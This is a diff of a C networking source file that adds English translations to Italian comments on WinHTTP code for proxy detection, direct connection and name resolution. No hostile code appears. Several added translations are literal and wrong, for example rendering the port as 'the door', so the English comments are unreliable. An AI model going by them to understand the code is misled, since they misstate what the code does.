@@ -57,7 +57,7 @@ PBYTE WinHTTPGetResponse(PULONG uOut)
 	{
 		if (!WinHttpReadData(hGlobalInternet, pHttpResponseBuffer + *uOut, uContentLength, &uRead))
 		{
-			//fixed (non veniva deallocato in caso di errore)
+			//fixed (non veniva deallocato in caso di errore) | (was not deallocated when an error occurs)
 			zfree(pHttpResponseBuffer);
 
 #ifdef _DEBUG
@@ -119,15 +119,15 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	ZeroMemory(&pProxyInfo, sizeof(pProxyInfo));
 	ZeroMemory(&pProxyConfig, sizeof(pProxyConfig));
 
-	// Crea una sessione per winhttp.
+	// Crea una sessione per winhttp. | Create a session for winhttp.
 	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
 
-	// Cerca nel registry le configurazioni del proxy
+	// Cerca nel registry le configurazioni del proxy | Search the registry configuration of the proxy
 	if (hSession && WinHttpGetIEProxyConfigForCurrentUser(&pProxyConfig)) 
 	{
 		if (pProxyConfig.lpszProxy) 
 		{
-			// Proxy specificato
+			// Proxy specificato | specified
 			pProxyInfo.lpszProxy = pProxyConfig.lpszProxy;
 			pProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
 			pProxyInfo.lpszProxyBypass = NULL;
@@ -161,13 +161,13 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 				memcpy(&pProxyInfo, &pProxyInfoTemp, sizeof(pProxyInfo));
 		}
 
-		// Se ha trovato un valore sensato per il proxy, allora ritorna
+		// Se ha trovato un valore sensato per il proxy, allora ritorna | If you have found a value that makes sense for the proxy, then returns
 		if (pProxyInfo.lpszProxy) 
 		{
 			isProxy = TRUE;
 			WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, &pProxyInfo, sizeof(pProxyInfo));
 
-			// Parsa la stringa per separare la porta
+			// Parsa la stringa per separare la porta | Parse the string to separate the door
 			_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%S", pProxyInfo.lpszProxy);
 			if (pAddrPtr = (PBYTE)strchr((PCHAR)pAddrToConnect, (int)':')) 
 			{
@@ -192,7 +192,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 
 	if (!isProxy) 
 	{
-		*pPortToConnect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80
+		*pPortToConnect = 80; // se ci stiamo connettendo diretti usiamo di default la porta 80 | if we are connecting direct use of default port 80
 		if (!ResolveName(pServerUrl, pAddrToConnect, uBufLen))
 		{
 #ifdef _DEBUG
@@ -201,13 +201,13 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 #endif
 			return FALSE;
 		}
-		swprintf_s(_wHost, L"%S", pAddrToConnect); // In questo caso mette nella richiesta winhttp direttamente l'indirizzo IP
+		swprintf_s(_wHost, L"%S", pAddrToConnect); // In questo caso mette nella richiesta winhttp direttamente l'indirizzo IP | In this case puts in the request directly winhttp IP address
 	}
 
 #ifdef _DEBUG
 	OutputDebug(L"[*] WinHTTPSetup got host: %s, port: %d\n", &_wHost, *pPortToConnect);
 #endif
-	// Definisce il target
+	// Definisce il target | Defines the target
 	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
 		return FALSE;
 
@@ -238,7 +238,7 @@ BOOL ResolveName(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen)
 	OutputDebug(L"[*] ResolveName resolving: %S\n", pServerUrl);
 #endif
 
-	// E' gia' un indirizzo IP
+	// E' gia' un indirizzo IP | E 'already' an IP address
 	if (inet_addr((PCHAR)pServerUrl) != INADDR_NONE) 
 	{
 		_snprintf_s((PCHAR)pAddrToConnect, uBufLen, _TRUNCATE, "%s", pServerUrl);
